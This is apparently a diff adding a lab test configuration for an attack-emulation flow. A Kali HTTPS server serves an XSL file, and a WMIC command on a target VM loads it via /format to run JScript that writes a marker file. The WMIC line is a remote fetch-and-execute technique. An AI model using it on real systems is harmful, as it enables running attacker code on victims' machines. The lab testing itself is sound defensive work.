@@ -1,0 +1,7 @@
+flow=flow6-https-jscript
+kali_service=python3 lab_https_server.py --bind 192.168.1.50 --port 18443 --directory /tmp/wmic-https6 --cert /tmp/wmic-https6/cert.pem --key /tmp/wmic-https6/key.pem
+internal_name=certutil.lab mapped only to 192.168.1.50 on VM 104
+served_fixture=wmic-jscript-https.xsl
+target=192.168.1.52
+command=C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"https://certutil.lab:18443/wmic-jscript-https.xsl"
+effects=write C:\lab\wmic-https-marker.txt through cmd.exe only
